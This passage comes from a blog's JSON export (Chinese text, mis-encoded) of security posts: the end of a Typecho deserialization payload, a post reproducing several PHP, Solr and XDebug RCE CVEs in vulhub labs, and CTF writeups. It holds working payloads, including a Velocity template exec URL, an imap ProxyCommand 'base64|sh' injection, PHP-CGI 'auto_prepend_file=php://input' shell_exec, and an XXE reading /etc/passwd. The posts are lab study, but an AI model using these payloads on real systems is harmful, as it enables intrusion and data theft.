__construct() &#123; $this-&gt;_type &#x3D; self::RSS2; $item[&#39;author&#39;] &#x3D; new Typecho_Request(); $item[&#39;category&#39;] &#x3D; array(new Typecho_Request()); $this-&gt;_items[0] &#x3D; $item; &#125; &#125; class Typecho_Request&#123; private $_filter &#x3D; array(); private $_params &#x3D; array(); public function __construct() &#123; $this-&gt;_params[&#39;screenName&#39;] &#x3D; &#39;1&#39;; $this-&gt;_filter[0] &#x3D; &#39;phpinfo&#39;; &#125; &#125; $a &#x3D; new Typecho_Feed(); $b &#x3D; [&#39;adapter&#39;&#x3D;&gt;$a]; echo urlencode(base64_encode(serialize($b))); 1YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjc6InBocGluZm8iO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOiIxIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjc6InBocGluZm8iO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOiIxIjt9fX19fXM6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7fX0%3D å‚è€ƒé“¾æ¥ https://www.cnblogs.com/litlife/p/11273647.html https://paper.seebug.org/424/","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"å¤ç°å‡ ä¸ªæ¼æ´","slug":"å¤ç°å‡ ä¸ªè¿‘æœŸæ¼æ´","date":"2019-11-16T04:36:45.000Z","updated":"2020-04-10T03:26:49.560Z","comments":true,"path":"2019/11/16/å¤ç°å‡ ä¸ªè¿‘æœŸæ¼æ´/","link":"","permalink":"https://glotozz.github.io/2019/11/16/%E5%A4%8D%E7%8E%B0%E5%87%A0%E4%B8%AA%E8%BF%91%E6%9C%9F%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• 1ã€php è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2019-11043) æ¼æ´è¯¦æƒ… æ­å»ºç¯å¢ƒ 2ã€Apache solræ¨¡æ¿æ³¨å…¥æ¼æ´ 3ã€PHP imap è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-19518ï¼‰ æ­å»ºç¯å¢ƒ æ¼æ´å¤ç° 4ã€PHP-CGIè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2012-1823ï¼‰ æ­å»ºç¯å¢ƒ æ¼æ´å¤ç° 5ã€PHPæ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆåˆ©ç”¨phpinfoï¼‰ åˆ©ç”¨åŸç† æ­å»ºç¯å¢ƒ æ¼æ´å¤ç° 6ã€XDebug è¿œç¨‹è°ƒè¯•æ¼æ´ï¼ˆä»£ç æ‰§è¡Œï¼‰ æ­å»ºç¯å¢ƒ æ¼æ´å¤ç° å‚è€ƒé“¾æ¥ï¼š 1ã€php è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2019-11043) é“¾æ¥ï¼š https://bugs.php.net/bug.php?id=78599 env_path_info underflow in fpm_main.c can lead to RCE æ¼æ´è¯¦æƒ… å½“Nginxä½¿ç”¨ç‰¹å®šçš„fastcgié…ç½®æ—¶ï¼Œå­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œä½†è¿™ä¸ªé…ç½®å¹¶éNginxé»˜è®¤é…ç½®ã€‚å½“fastcgi_split_path_infoå­—æ®µè¢«é…ç½®ä¸º ^(.+?\\.php)(/.*)$;æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„payloadï¼Œé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¯¥é…ç½®å·²è¢«å¹¿æ³›ä½¿ç”¨ï¼Œå±å®³è¾ƒå¤§ å½“Nginx + php-fpmçš„æœåŠ¡å™¨æœ‰å¦‚ä¸‹é…ç½®çš„æ—¶å€™ï¼Œéƒ½ä¼šå‡ºç°RCE 1234567location ~ [^&#x2F;]\\.php(&#x2F;|$) &#123; ... fastcgi_split_path_info ^(.+?\\.php)(&#x2F;.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ...&#125; æ­å»ºç¯å¢ƒ ç¯å¢ƒï¼š https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043 ä¹‹å‰ä¸€ç›´æ˜¯ç”¨dockerï¼Œè¿™é‡Œéœ€è¦ç”¨docker-compose 123#å®‰è£…curl -L https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;1.22.0&#x2F;docker-compose-&#96;uname -s&#96;-&#96;uname -m&#96; &gt; &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-composechmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose æ‹‰å–å¹¶æ­å»º 1[root@glotozz CVE-2019-11043]# docker-compose up -d èƒ½è®¿é—®http://ip:8080/index.phpå³å¯ å·¥å…·ï¼š https://github.com/neex/phuip-fpizdam éœ€è¦å®‰è£…goè¯­è¨€ 123wget https:&#x2F;&#x2F;dl.google.com&#x2F;go&#x2F;go1.12.linux-amd64.tar.gzsudo tar -zxvf go1.12.linux-amd64.tar.gz -C &#x2F;usr&#x2F;localexport PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;go&#x2F;bin è¿›å…¥POCç›®å½• 12go buildgo run . &quot;http:&#x2F;&#x2F;59.110.164.44:8080&#x2F;index.php&quot; æ³¨æ„ï¼Œå› ä¸ºphp-fpmä¼šå¯åŠ¨å¤šä¸ªå­è¿›ç¨‹ï¼Œåœ¨è®¿é—®/index.php?a=idæ—¶éœ€è¦å¤šè®¿é—®å‡ æ¬¡ï¼Œä»¥è®¿é—®åˆ°è¢«æ±¡æŸ“çš„è¿›ç¨‹ã€‚ 2ã€Apache solræ¨¡æ¿æ³¨å…¥æ¼æ´ 2019å¹´10æœˆ31æ—¥ï¼Œå›½å¤–å®‰å…¨ç ”ç©¶å‘˜s00pyåœ¨Githubå…¬å¼€äº†ä¸€ä¸ªApache Solr Velocityæ¨¡æ¿æ³¨å…¥è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„pocã€‚ ç»è¿‡ç ”ç©¶ï¼Œå‘ç°è¯¥0dayæ¼æ´çœŸå®æœ‰æ•ˆå¹¶ä¸”å¯ä»¥æ”»å‡»æœ€æ–°ç‰ˆæœ¬(8.2.0)çš„Solrã€‚ ç¯å¢ƒï¼š https://www.apache.org/dyn/closer.lua/lucene/solr/8.2.0/solr-8.2.0.zip æ­å»º éœ€è¦åˆ›å»ºä¸€ä¸ªcoreï¼Œ å…ˆæ‰‹åŠ¨åœ¨/server/solr/ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªtestçš„æ–‡ä»¶å¤¹ï¼Œç„¶åå°†/server/solr/configsets/_default/ä¸‹çš„confç›®å½•æ‹·è´åˆ°testç›®å½•ä¸‹ ï¼Œ å†åœ¨é¡µé¢åˆ›å»º è®¿é—®http://127.0.0.1:8983/solr/test/config Apache Solré»˜è®¤é›†æˆVelocityResponseWriteræ’ä»¶ï¼Œè¯¥æ’ä»¶åˆå§‹åŒ–å‚æ•°ä¸­çš„params.resource.loader.enabledé»˜è®¤å€¼è®¾ç½®ä¸ºfalseï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡POSTè¯·æ±‚ç›´æ¥ä¿®æ”¹é›†åˆè®¾ç½®ï¼Œå°†å…¶è®¾ç½®ä¸ºtrueï¼Œç„¶åå°±å¯ä»¥æ„é€ ç‰¹æ®Šçš„GETè¯·æ±‚æ¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ 12345678910&#123; &quot;update-queryresponsewriter&quot;: &#123; &quot;startup&quot;: &quot;lazy&quot;, &quot;name&quot;: &quot;velocity&quot;, &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;, &quot;template.base.dir&quot;: &quot;&quot;, &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;, &quot;params.resource.loader.enabled&quot;: &quot;true&quot; &#125;&#125; å†æ¬¡è§‚å¯Ÿå·²è¢«ç½®ä¸ºtrue å®ç°RCE 1select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end å‰ä¸¤ä¸ªæ˜¯Seebugæ¼æ´åº“çœ‹åˆ°çš„æ¯”è¾ƒæ–°çš„æ¼æ´ï¼Œåé¢çš„æ˜¯å¤ç°ç¬¬ä¸€ä¸ªæ¼æ´æ—¶å‘ç°äº†vulhubï¼Œæ”¾åœ¨ä¸€èµ·è¿˜æœ‰å‡ ä¸ªæ—©ä¸€ç‚¹çš„æ¼æ´ï¼Œé¡ºä¾¿å­¦ä¹ å¤ç°ä¸‹ 3ã€PHP imap è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-19518ï¼‰ php imapæ‰©å±•ç”¨äºåœ¨PHPä¸­æ‰§è¡Œé‚®ä»¶æ”¶å‘æ“ä½œã€‚å…¶imap_openå‡½æ•°ä¼šè°ƒç”¨rshæ¥è¿æ¥è¿œç¨‹shellï¼Œè€Œdebian/ubuntuä¸­é»˜è®¤ä½¿ç”¨sshæ¥ä»£æ›¿rshçš„åŠŸèƒ½ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨debianç³»åˆ—ç³»ç»Ÿä¸­ï¼Œæ‰§è¡Œrshå‘½ä»¤å®é™…æ‰§è¡Œçš„æ˜¯sshå‘½ä»¤ï¼‰ã€‚ å› ä¸ºsshå‘½ä»¤ä¸­å¯ä»¥é€šè¿‡è®¾ç½®-oProxyCommand=æ¥è°ƒç”¨ç¬¬ä¸‰æ–¹å‘½ä»¤ï¼Œæ”»å‡»è€…é€šè¿‡æ³¨å…¥æ³¨å…¥è¿™ä¸ªå‚æ•°ï¼Œæœ€ç»ˆå°†å¯¼è‡´å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ æ­å»ºç¯å¢ƒ ç¯å¢ƒï¼š https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518 1docker-compose up -d æ¼æ´å¤ç°1hostname&#x3D;x -oProxyCommand&#x3D;echo ZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo&#x3D;|base64 -d|sh&#125;&amp;username&#x3D;111&amp;password&#x3D;222 å…¶ä¸­ä¸­é—´é‚£æ®µbase64è§£ç ä¸ºecho &#39;1234567890&#39;&gt;/tmp/test0001 1docker-compose exec web bash 4ã€PHP-CGIè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2012-1823ï¼‰å½±å“ç‰ˆæœ¬ php &lt; 5.3.12 or php &lt; 5.4.2 è®¿é—®http://your-ip:8080/index.php?-så³çˆ†å‡ºæºç ï¼Œè¯´æ˜æ¼æ´å­˜åœ¨ã€‚ é‚£ä¹ˆï¼Œå¯æ§å‘½ä»¤è¡Œå‚æ•°ï¼Œèƒ½åšäº›ä»€ä¹ˆäº‹ã€‚ é€šè¿‡é˜…è¯»æºç ï¼Œæˆ‘å‘ç°cgiæ¨¡å¼ä¸‹æœ‰å¦‚ä¸‹ä¸€äº›å‚æ•°å¯ç”¨ï¼š -c æŒ‡å®šphp.iniæ–‡ä»¶çš„ä½ç½® -n ä¸è¦åŠ è½½php.iniæ–‡ä»¶ -d æŒ‡å®šé…ç½®é¡¹ -b å¯åŠ¨fastcgiè¿›ç¨‹ -s æ˜¾ç¤ºæ–‡ä»¶æºç  -T æ‰§è¡ŒæŒ‡å®šæ¬¡è¯¥æ–‡ä»¶ -hå’Œ-? æ˜¾ç¤ºå¸®åŠ© æœ€ç®€å•çš„åˆ©ç”¨æ–¹å¼ï¼Œå½“ç„¶å°±æ˜¯-sï¼Œå¯ä»¥ç›´æ¥æ˜¾ç¤ºæºç ï¼š çªç„¶æƒ³èµ·ä¹‹å‰æœ‰äº›é¢˜ç›®æ˜¯é€šè¿‡è¿™ä¸ªæ¥è¯»å–æºç çš„ï¼Œæ¼æ´åŸç†å…·ä½“å‚è€ƒé“¾æ¥ï¼Œè¿˜æ˜¯æ¯”è¾ƒå¥½ç†è§£çš„ è¿™ä¸ªæ¼æ´ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ç”¨æˆ·è¯·æ±‚çš„querystringè¢«ä½œä¸ºäº†php-cgiçš„å‚æ•°ï¼Œæœ€ç»ˆå¯¼è‡´äº†ä¸€ç³»åˆ—ç»“æœã€‚ æ­å»ºç¯å¢ƒ ç¯å¢ƒï¼š https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823 1docker-compose up -d æ¼æ´å¤ç°1http:&#x2F;&#x2F;59.110.164.44:8080&#x2F;?-s 1234&#x2F;index.php?-d allow_url_include&#x3D;on -d auto_prepend_file&#x3D;php:&#x2F;&#x2F;inputPOST:&lt;?php echo shell_exec(&quot;id&quot;); ?&gt; 5ã€PHPæ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆåˆ©ç”¨phpinfoï¼‰ PHPæ–‡ä»¶åŒ…å«æ¼æ´ä¸­ï¼Œå¦‚æœæ‰¾ä¸åˆ°å¯ä»¥åŒ…å«çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŒ…å«ä¸´æ—¶æ–‡ä»¶çš„æ–¹æ³•æ¥getshellã€‚å› ä¸ºä¸´æ—¶æ–‡ä»¶åæ˜¯éšæœºçš„ï¼Œå¦‚æœç›®æ ‡ç½‘ç«™ä¸Šå­˜åœ¨phpinfoï¼Œåˆ™å¯ä»¥é€šè¿‡phpinfoæ¥è·å–ä¸´æ—¶æ–‡ä»¶åï¼Œè¿›è€Œè¿›è¡ŒåŒ…å«ã€‚ åˆ©ç”¨åŸç† åœ¨ç»™PHPå‘é€POSTæ•°æ®åŒ…æ—¶ï¼Œå¦‚æœæ•°æ®åŒ…é‡ŒåŒ…å«æ–‡ä»¶åŒºå—ï¼Œæ— è®ºä½ è®¿é—®çš„ä»£ç ä¸­æœ‰æ²¡æœ‰å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ï¼ŒPHPéƒ½ä¼šå°†è¿™ä¸ªæ–‡ä»¶ä¿å­˜æˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯/tmp/php[6ä¸ªéšæœºå­—ç¬¦]ï¼‰ï¼Œæ–‡ä»¶åå¯ä»¥åœ¨$_FILESå˜é‡ä¸­æ‰¾åˆ°ã€‚è¿™ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œåœ¨è¯·æ±‚ç»“æŸåå°±ä¼šè¢«åˆ é™¤ã€‚ åŒæ—¶ï¼Œå› ä¸ºphpinfoé¡µé¢ä¼šå°†å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰å˜é‡éƒ½æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœå‘phpinfoé¡µé¢å‘é€åŒ…å«æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…ï¼Œåˆ™å³å¯åœ¨è¿”å›åŒ…é‡Œæ‰¾åˆ°$_FILESå˜é‡çš„å†…å®¹ï¼Œè‡ªç„¶ä¹ŸåŒ…å«ä¸´æ—¶æ–‡ä»¶åã€‚ åœ¨æ–‡ä»¶åŒ…å«æ¼æ´æ‰¾ä¸åˆ°å¯åˆ©ç”¨çš„æ–‡ä»¶æ—¶ï¼Œå³å¯åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæ‰¾åˆ°ä¸´æ—¶æ–‡ä»¶åï¼Œç„¶ååŒ…å«ä¹‹ã€‚ ä½†æ–‡ä»¶åŒ…å«æ¼æ´å’Œphpinfoé¡µé¢é€šå¸¸æ˜¯ä¸¤ä¸ªé¡µé¢ï¼Œç†è®ºä¸Šæˆ‘ä»¬éœ€è¦å…ˆå‘é€æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œç„¶åä»è¿”å›é¡µé¢ä¸­åŒ¹é…å‡ºä¸´æ—¶æ–‡ä»¶åï¼Œå†å°†è¿™ä¸ªæ–‡ä»¶åå‘é€ç»™æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢ï¼Œè¿›è¡Œgetshellã€‚åœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚ç»“æŸæ—¶ï¼Œä¸´æ—¶æ–‡ä»¶å°±è¢«åˆ é™¤äº†ï¼Œç¬¬äºŒä¸ªè¯·æ±‚è‡ªç„¶ä¹Ÿå°±æ— æ³•è¿›è¡ŒåŒ…å«ã€‚ è¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°æ¡ä»¶ç«äº‰ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹ï¼š å‘é€åŒ…å«äº†webshellçš„ä¸Šä¼ æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œè¿™ä¸ªæ•°æ®åŒ…çš„headerã€getç­‰ä½ç½®éœ€è¦å¡æ»¡åƒåœ¾æ•°æ® å› ä¸ºphpinfoé¡µé¢ä¼šå°†æ‰€æœ‰æ•°æ®éƒ½æ‰“å°å‡ºæ¥ï¼Œ1ä¸­çš„åƒåœ¾æ•°æ®ä¼šå°†æ•´ä¸ªphpinfoé¡µé¢æ’‘å¾—éå¸¸å¤§ phpé»˜è®¤çš„è¾“å‡ºç¼“å†²åŒºå¤§å°ä¸º4096ï¼Œå¯ä»¥ç†è§£ä¸ºphpæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥ æ‰€ä»¥ï¼Œæˆ‘ä»¬ç›´æ¥æ“ä½œåŸç”Ÿsocketï¼Œæ¯æ¬¡è¯»å–4096ä¸ªå­—èŠ‚ã€‚åªè¦è¯»å–åˆ°çš„å­—ç¬¦é‡ŒåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œå°±ç«‹å³å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ… æ­¤æ—¶ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„socketè¿æ¥å®é™…ä¸Šè¿˜æ²¡ç»“æŸï¼Œå› ä¸ºphpè¿˜åœ¨ç»§ç»­æ¯æ¬¡è¾“å‡º4096ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸´æ—¶æ–‡ä»¶æ­¤æ—¶è¿˜æ²¡æœ‰åˆ é™¤ åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œç¬¬äºŒä¸ªæ•°æ®åŒ…ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨ï¼Œå³å¯æˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€ç»ˆgetshell æ­å»ºç¯å¢ƒ ç¯å¢ƒï¼š https://github.com/vulhub/vulhub/tree/master/php/inclusion 1docker-compose up -d æ¼æ´å¤ç° åˆ©ç”¨è„šæœ¬exp.pyå®ç°äº†ä¸Šè¿°è¿‡ç¨‹ï¼ŒæˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œä¼šæ‰§è¡Œ&#39;)?&gt;ï¼Œå†™å…¥ä¸€ä¸ªæ–°çš„æ–‡ä»¶/tmp/gï¼Œè¿™ä¸ªæ–‡ä»¶å°±ä¼šæ°¸ä¹…ç•™åœ¨ç›®æ ‡æœºå™¨ä¸Šã€‚ ç”¨python2æ‰§è¡Œï¼špython exp.py your-ip 8080 100ï¼š å¤±è´¥äº†ã€‚ã€‚ 6ã€XDebug è¿œç¨‹è°ƒè¯•æ¼æ´ï¼ˆä»£ç æ‰§è¡Œï¼‰ XDebugæ˜¯PHPçš„ä¸€ä¸ªæ‰©å±•ï¼Œç”¨äºè°ƒè¯•PHPä»£ç ã€‚å¦‚æœç›®æ ‡å¼€å¯äº†è¿œç¨‹è°ƒè¯•æ¨¡å¼ï¼Œå¹¶è®¾ç½®remote_connect_back = 1ï¼š 12xdebug.remote_connect_back &#x3D; 1xdebug.remote_enable &#x3D; 1 è¿™ä¸ªé…ç½®ä¸‹ï¼Œæˆ‘ä»¬è®¿é—®http://target/index.php?XDEBUG_SESSION_START=phpstormï¼Œç›®æ ‡æœåŠ¡å™¨çš„XDebugå°†ä¼šè¿æ¥è®¿é—®è€…çš„IPï¼ˆæˆ–X-Forwarded-Forå¤´æŒ‡å®šçš„åœ°å€ï¼‰å¹¶é€šè¿‡dbgpåè®®ä¸å…¶é€šä¿¡ï¼Œæˆ‘ä»¬é€šè¿‡dbgpä¸­æä¾›çš„evalæ–¹æ³•å³å¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„PHPä»£ç ã€‚ æ­å»ºç¯å¢ƒ ç¯å¢ƒï¼š https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce 1docker-compose up -d æ¼æ´å¤ç° å‚è€ƒé“¾æ¥ï¼šhttp://www.thinkphp.cn/topic/66216.html https://www.cnblogs.com/yuzly/p/11782608.html https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template https://github.com/vulhub/vulhub","categories":[],"tags":[]},{"title":"æ¹–æ¹˜æ¯+çº¢å¸½æ¯+ç™¾è¶Šæ¯wp","slug":"æ¹–æ¹˜æ¯-çº¢å¸½æ¯-ç™¾è¶Šæ¯wp","date":"2019-11-09T11:16:24.000Z","updated":"2020-03-31T00:34:46.718Z","comments":true,"path":"2019/11/09/æ¹–æ¹˜æ¯-çº¢å¸½æ¯-ç™¾è¶Šæ¯wp/","link":"","permalink":"https://glotozz.github.io/2019/11/09/%E6%B9%96%E6%B9%98%E6%9D%AF-%E7%BA%A2%E5%B8%BD%E6%9D%AF-%E7%99%BE%E8%B6%8A%E6%9D%AFwp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• æ¹–æ¹˜æ¯ web1 web2 åˆ›æ–°æ–¹å‘4 åˆ›æ–°æ–¹å‘5 çº¢å¸½æ¯ web1 bank_service web2 ticket_system ç™¾è¶Šæ¯ ç¬¬ä¸€é¢˜ ç¬¬äºŒé¢˜ å‚è€ƒé“¾æ¥ æ¹–æ¹˜æ¯web1å‚è€ƒé“¾æ¥1ï¼Œåº”è¯¥æ˜¯éé¢„æœŸè§£ï¼Œå¤ç°å³å¯ å”¯ä¸€çš„åŒºåˆ«æ˜¯ä¼ å…¥çš„urléœ€è¦å‰ç¼€httpï¼Œå¯ä»¥åŠ ä¸ªé‡å®šå‘ 123&lt;?php header(&quot;Location:listen:&#x2F;&#x2F;listen.xyz&quot;);?&gt; web2tp5çš„å†å²RCEæ¼æ´ï¼Œä¹‹å‰å¤ç°è¿‡ï¼Œä¸€æŠŠæ¢­ åˆ›æ–°æ–¹å‘4å‚è€ƒé“¾æ¥2ï¼Œå¤ç°å³å¯ åˆ›æ–°æ–¹å‘5 å‚è€ƒé“¾æ¥3ï¼Œå‰åŠéƒ¨åˆ†ï¼Œä¸»è¦å°±æ˜¯ï¼„é$ æ„é€  1?keyone&#x3D;00000000000000000000000000000000000000000000000000000000000000000000006666672%EF%BC%84 ç„¶åæ˜¯ 123if(strstr($_SERVER[&#39;REQUEST_URI&#39;],&#39;You_Are_Cool&#39;))&#123; exit();&#125; åªéœ€è¦åˆ©ç”¨urlç¼–ç ç»•è¿‡å³å¯ ç„¶åæ˜¯ 12if(mime_content_type($f) &#x3D;&#x3D; &#39;application&#x2F;vnd.font-fontforge-sfd&#39;)&#123;&#125; ä¸€å¼€å§‹æƒ³ç€æ”¹Content-Typeï¼Œå‘ç°ä¿®æ”¹å¯¹ç»“æœæ²¡æœ‰å½±å“ï¼Œä¿®æ”¹å†…å®¹å¤´éƒ¨å‘ç°æœ‰ç”¨ï¼Œæœç´¢ä¸€æ³¢å‘ç°å¦‚ä¸‹å³å¯ç»•è¿‡ 1SplineFontDB: 3.0 æœ€åä¸€æ­¥å¡ä½äº†ï¼Œ 12345if(!strstr($filename,&quot;.&quot;))&#123; echo &quot;ok33&quot;; echo $filename; file_put_contents(&#39;&#x2F;tmp&#x2F;&#39;.$filename,$secert);&#125; æ— æ³•ç»•è¿‡.å°±æ— æ³•éå†ç›®å½•ï¼Œä¹Ÿæ²¡æ‰¾åˆ°ç›®å½•éå†ã€æ–‡ä»¶åŒ…å«ç­‰æ¼æ´ sessionå­˜åœ¨äºtmpç›®å½•ä¸‹ï¼Œä½†æ˜¯å³ä½¿è¦†ç›–ä¹Ÿç¼ºå°‘åç»­åˆ©ç”¨çš„åœ°æ–¹ çº¢å¸½æ¯web1 bank_servicenodejsæ­å»ºçš„èŠå¤©å®¤ï¼ŒçŒœæµ‹æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚å¥½å§ä¸æ˜¯ å‚è€ƒï¼š https://blog.zeddyu.info/2019/11/13/Red-Hat-2019/#bank-service è€ƒç‚¹æ˜¯solr RCE ï¼Œæ²¡æœ‰ç¯å¢ƒé¸½äº† web2 ticket_systemXXEè¯»æºç  12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;ticket&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;code&gt;123123&lt;&#x2F;code&gt;&lt;&#x2F;ticket&gt; 12&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;app&#x2F;controller&#x2F;Index.php&quot;&gt;&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;app&#x2F;controller&#x2F;Ticket.php&quot;&gt; /etc/passwd 1234567891011121314151617181920root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashdaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;falsemysql:x:101:101:MySQL 